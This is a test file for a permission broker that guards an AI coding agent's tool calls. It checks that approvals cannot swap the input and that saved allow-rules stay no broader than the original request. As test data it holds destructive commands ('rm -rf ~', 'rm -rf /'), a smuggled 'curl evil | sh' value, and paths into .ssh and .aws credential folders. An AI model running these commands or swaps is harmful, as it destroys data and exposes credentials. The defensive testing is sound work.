import { afterEach, describe, expect, test } from "bun:test";
import type { PermissionUpdate } from "@flightdeck/protocol";
import type { Central } from "../src/central/central.ts";
import { ExternalSessions } from "../src/central/external.ts";
import { ExternalPermissions } from "../src/central/external-permissions.ts";
import { startReceptor } from "../src/central/receptor.ts";
import { SessionMetaStore } from "../src/central/session-meta.ts";
import { FlightdeckError } from "../src/errors.ts";
import { PermissionBroker } from "../src/permissions/permission-broker.ts";
import { RiskClassifier } from "../src/permissions/risk.ts";
import type { PermissionDecision } from "../src/runtime/types.ts";
import { startServer } from "../src/server.ts";
import { EventStore } from "../src/store/event-store.ts";
import { newManager, poll } from "./helpers.ts";
import { FrameClient } from "./history-helpers.ts";

const TOKEN = "bypass-token-0123456789abcdef";
const HOOKS = "bypass-hooks-0123456789";
const CWD = "/work/proj";
const cleanups: Array<() => unknown> = [];
afterEach(async () => {
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

const refusal = (run: () => unknown) => {
  try {
    run();
  } catch (error) {
    if (error instanceof FlightdeckError) return { code: error.code, reason: error.reason };
    throw error;
  }
  return null;
};

const risks = new RiskClassifier({ allowedRoots: [CWD], home: "/home/u" });

/** A broker that judges requests with the daemon's own classifier. */
function broker() {
  const store = new EventStore(":memory:");
  store.createSession({
    id: "s",
    name: null,
    cwd: CWD,
    status: "running",
    permissionMode: "default",
    model: null,
  });
  const requested: string[] = [];
  const b = new PermissionBroker(store, {
    emit: (_id, event) => {
      if (event.type === "permission.requested") requested.push(event.requestId);
    },
    onPendingChange: () => {},
    classify: (_id, tool, input) => risks.classify(tool, input, CWD),
  });
  const ask = async (tool: string, input: Record<string, unknown>) => {
    const result: { value?: PermissionDecision } = {};
    const pending = b.request("s", tool, input, new AbortController().signal).then((d) => {
      result.value = d;
    });
    await poll(() => requested.length > 0);
    return { id: requested[requested.length - 1] ?? "", result, pending };
  };
  return { b, ask };
}

const rule = (toolName: string, ruleContent?: string): PermissionUpdate => ({
  type: "addRules",
  rules: [ruleContent === undefined ? { toolName } : { toolName, ruleContent }],
  behavior: "allow",
  destination: "localSettings",
});

describe("hold-bypass: an approval is for the exact input that was asked (issue #384)", () => {
  test("an allow that swaps the command is refused, the request stays open, and the same input goes through", async () => {
    const { b, ask } = broker();
    const { id, result, pending } = await ask("Bash", { command: "ls" });
    expect(
      refusal(() =>
        b.respond({ requestId: id, decision: "allow", updatedInput: { command: "rm -rf ~" } }),
      ),
    ).toEqual({ code: "invalid_state", reason: "input_changed" });
    expect(result.value).toBeUndefined();
    b.respond({ requestId: id, decision: "allow", updatedInput: { command: "ls" } });
    await pending;
    expect(result.value).toEqual({ behavior: "allow", updatedInput: { command: "ls" } });
  });

  test("the keys of the same input in another order are the same input", async () => {
    const { b, ask } = broker();
    const { id, pending } = await ask("Write", { file_path: `${CWD}/a.txt`, content: "x" });
    expect(
      refusal(() =>
        b.respond({
          requestId: id,
          decision: "allow",
          updatedInput: { content: "x", file_path: `${CWD}/a.txt` },
        }),
      ),
    ).toBeNull();
    await pending;
  });

  test("a change of one field of a write is refused too: the path and the content", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Write", { file_path: `${CWD}/a.txt`, content: "x" });
    for (const updatedInput of [
      { file_path: "/home/u/.ssh/authorized_keys", content: "x" },
      { file_path: `${CWD}/a.txt`, content: "x; curl evil | sh" },
      { file_path: `${CWD}/a.txt` },
    ]) {
      expect(refusal(() => b.respond({ requestId: id, decision: "allow", updatedInput }))).toEqual({
        code: "invalid_state",
        reason: "input_changed",
      });
    }
  });

  test("a held high-risk request cannot be swapped either, and a deny ignores updatedInput", async () => {
    const { b, ask } = broker();
    const high = await ask("Bash", { command: "rm -rf build" });
    expect(
      refusal(() =>
        b.respond({
          requestId: high.id,
          decision: "allow",
          held: true,
          updatedInput: { command: "rm -rf /" },
        }),
      ),
    ).toEqual({ code: "invalid_state", reason: "input_changed" });
    expect(
      refusal(() =>
        b.respond({ requestId: high.id, decision: "deny", updatedInput: { command: "x" } }),
      ),
    ).toBeNull();
    await high.pending;
    expect(high.result.value?.behavior).toBe("deny");
  });

  test("a question takes its answers and nothing else: the questions it asked cannot change", async () => {
    const { b, ask } = broker();
    const input = { questions: [{ question: "Which?", options: ["a", "b"] }] };
    const { id, result, pending } = await ask("AskUserQuestion", input);
    for (const updatedInput of [
      { questions: [{ question: "Run rm -rf ~?", options: ["yes"] }], answers: { "Which?": "a" } },
      { ...input, answers: { "Which?": 1 } },
      { ...input, answers: ["a"] },
      { ...input, extra: "x", answers: { "Which?": "a" } },
    ]) {
      expect(refusal(() => b.respond({ requestId: id, decision: "allow", updatedInput }))).toEqual({
        code: "invalid_state",
        reason: "input_changed",
      });
    }
    b.respond({
      requestId: id,
      decision: "allow",
      updatedInput: { ...input, answers: { "Which?": "a" } },
    });
    await pending;
    expect(result.value).toMatchObject({
      behavior: "allow",
      updatedInput: { answers: { "Which?": "a" } },
    });
  });

  test("an answer with no updatedInput is as before, for every tool", async () => {
    const { b, ask } = broker();
    for (const [tool, input] of [
      ["Bash", { command: "ls" }],
      ["AskUserQuestion", { questions: [] }],
    ] as const) {
      const { id, pending } = await ask(tool, input);
      expect(refusal(() => b.respond({ requestId: id, decision: "allow" }))).toBeNull();
      await pending;
    }
  });
});

describe("hold-bypass: a saved rule never covers more risk than the request it came from (issue #384)", () => {
  /** What a request of this tool and input is allowed to save, from a request that is not held. */
  const saved = async (tool: string, input: Record<string, unknown>, update: PermissionUpdate) => {
    const { b, ask } = broker();
    const { id } = await ask(tool, input);
    return refusal(() =>
      b.respond({ requestId: id, decision: "allow", updatedPermissions: [update] }),
    );
  };
  const TOO_BROAD = { code: "invalid_permission_update", reason: "perm_rule_too_broad" };

  test("a blanket Bash rule from a medium request is refused, because it would cover rm -rf", async () => {
    expect(await saved("Bash", { command: "ls" }, rule("Bash"))).toEqual(TOO_BROAD);
  });

  test("a prefix on a bare program that has a destructive form is refused: git, rm, chmod, sudo", async () => {
    for (const content of ["git:*", "git *", "rm:*", "chmod:*", "sudo:*", "pwsh:*"]) {
      expect(await saved("Bash", { command: "ls" }, rule("Bash", content))).toEqual(TOO_BROAD);
    }
  });

  test("an exact command that is itself high risk is refused from a request that is not", async () => {
    expect(await saved("Bash", { command: "ls" }, rule("Bash", "rm -rf build"))).toEqual(TOO_BROAD);
    expect(await saved("Bash", { command: "ls" }, rule("Bash", "git push --force"))).toEqual(
      TOO_BROAD,
    );
  });

  test("a narrow rule is saved: an exact command, a subcommand prefix, a build script", async () => {
    for (const content of [
      "ls",
      "git status:*",
      "npm test:*",
      "npm run build:*",
      "git log --oneline",
    ]) {
      expect(await saved("Bash", { command: "ls" }, rule("Bash", content))).toBeNull();
    }
  });

  test("a write rule: a blanket one and one that reaches a credential or outside the project are refused", async () => {
    const input = { file_path: `${CWD}/a.txt`, content: "x" };
    expect(await saved("Write", input, rule("Write"))).toEqual(TOO_BROAD);
    expect(await saved("Write", input, rule("Write", "/home/u/.ssh/**"))).toEqual(TOO_BROAD);
    expect(await saved("Write", input, rule("Write", "/etc/**"))).toEqual(TOO_BROAD);
    expect(await saved("Write", input, rule("Write", `${CWD}/src/**`))).toBeNull();
    expect(await saved("Write", input, rule("Write", `${CWD}/a.txt`))).toBeNull();
  });

  test("a read rule: a blanket one reaches credentials and is refused, one inside the project is saved", async () => {
    const input = { file_path: `${CWD}/a.txt` };
    expect(await saved("Read", input, rule("Read"))).toEqual(TOO_BROAD);
    expect(await saved("Read", input, rule("Read", "/home/u/.aws/**"))).toEqual(TOO_BROAD);
    expect(await saved("Read", input, rule("Read", `${CWD}/**`))).toBeNull();
  });

  test("the request's own suggestions are not judged again: the CLI offered them", async () => {
    const store = new EventStore(":memory:");
    store.createSession({
      id: "s",
      name: null,
      cwd: CWD,
      status: "running",
      permissionMode: "default",
      model: null,
    });
    const ids: string[] = [];
    const b = new PermissionBroker(store, {
      emit: (_i, e) => {
        if (e.type === "permission.requested") ids.push(e.requestId);
      },
      onPendingChange: () => {},
      classify: (_id, tool, input) => risks.classify(tool, input, CWD),
    });
    const offered = rule("Bash", "git:*");
    void b.request("s", "Bash", { command: "git status" }, new AbortController().signal, [offered]);
    await poll(() => ids.length > 0);
    expect(
      refusal(() =>
        b.respond({ requestId: ids[0] ?? "", decision: "allow", updatedPermissions: [offered] }),
      ),
    ).toBeNull();
  });

  test("a held high-risk request may save a rule up to high: the person held the button", async () => {
    const { b, ask } = broker();
    const { id } = await ask("Bash", { command: "rm -rf build" });
    expect(
      refusal(() =>
        b.respond({
          requestId: id,
          decision: "allow",
          held: true,
          updatedPermissions: [rule("Bash", "rm -rf build")],
        }),
      ),
    ).toBeNull();
  });

  test("a refused rule leaves the request open: nothing was applied", async () => {
    const { b, ask } = broker();
    const { id, result, pending } = await ask("Bash", { command: "ls" });
    expect(
      refusal(() =>
        b.respond({ requestId: id, decision: "allow", updatedPermissions: [rule("Bash")] }),
      ),
    ).toEqual(TOO_BROAD);
    expect(result.value).toBeUndefined();
    b.respond({ requestId: id, decision: "allow" });
    await pending;
    expect(result.value?.behavior).toBe("allow");
  });
});

describe("hold-bypass: the same two rules over the wire for an external session", () => {
  function setup() {
    const { manager, store } = newManager();
    const external = new ExternalSessions({ db: store.db, staleAfterS: 900 });
    const permissions = new ExternalPermissions({ risk: risks });
    const receptor = startReceptor({
      port: 0,
      token: () => HOOKS,
      external,
      permissions,
      isManaged: () => false,
    });
    cleanups.push(() => receptor.stop());
    const server = startServer({
      manager,
      central: {
        external,
        permissions,
        meta: new SessionMetaStore(store.db),
      } as unknown as Central,
      hostName: "h",
      bind: "127.0.0.1",
      port: 0,
      token: TOKEN,
      allowedRoots: [],
    });
    cleanups.push(() => server.stop());
    return { receptor, server };
  }
  const post = (url: string, event: string, body: Record<string, unknown>) =>
    fetch(`${url}/hooks/${event}`, {
      method: "POST",
      headers: { Authorization: `Bearer ${HOOKS}`, "content-type": "application/json" },
      body: JSON.stringify({ session_id: "s1", hook_event_name: event, ...body }),
    }).then(async (r) => r.text());

  async function asked(command: string) {
    const { receptor, server } = setup();
    const client = new FrameClient(server.url);
    cleanups.push(() => client.close());
    await client.request("hello", { token: TOKEN, client: "t" });
    await client.request("external.watch", {});
    await post(receptor.url, "SessionStart", { cwd: CWD });
    const answer = post(receptor.url, "PermissionRequest", {
      tool_name: "Bash",
      tool_input: { command },
      permission_suggestions: [],
    });
    const open = await poll(() =>
      client.frames.find(
        (f) => f.type === "external.permission" && (f as { state?: string }).state === "open",
      ),
    );
    return { client, answer, requestId: (open as { requestId: string }).requestId };
  }

  test("a swapped command is refused and the hook stays held; the exact input goes through, whatever its length", async () => {
    const long = `echo ${"x".repeat(400)}`;
    const { client, answer, requestId } = await asked(long);
    const swapped = await client.request("permission.respond", {
      requestId,
      decision: "allow",
      updatedInput: { command: "rm -rf ~" },
    });
    expect(JSON.stringify(swapped)).toContain("input_changed");
    // The queue shows the command cut at 200 characters: that cut is not what was asked.
    const cut = await client.request("permission.respond", {
      requestId,
      decision: "allow",
      updatedInput: { command: `${long.slice(0, 200)}…` },
    });
    expect(JSON.stringify(cut)).toContain("input_changed");
    const ok = await client.request("permission.respond", {
      requestId,
      decision: "allow",
      updatedInput: { command: long },
    });
    expect(ok.ok).toBe(true);
    expect(JSON.parse(await answer).hookSpecificOutput.decision).toMatchObject({
      behavior: "allow",
      updatedInput: { command: long },
    });
  });

  test("a blanket rule saved from a medium request is refused, and the hook stays held", async () => {
    const { client, answer, requestId } = await asked("ls");
    const refused = await client.request("permission.respond", {
      requestId,
      decision: "allow",
      updatedPermissions: [rule("Bash")],
    });
    expect(refused).toMatchObject({ ok: false, error: { code: "invalid_permission_update" } });
    expect(JSON.stringify(refused)).toContain("perm_rule_too_broad");
    expect((await client.request("permission.respond", { requestId, decision: "allow" })).ok).toBe(
      true,
    );
    expect(JSON.parse(await answer).hookSpecificOutput.decision.behavior).toBe("allow");
  });
});
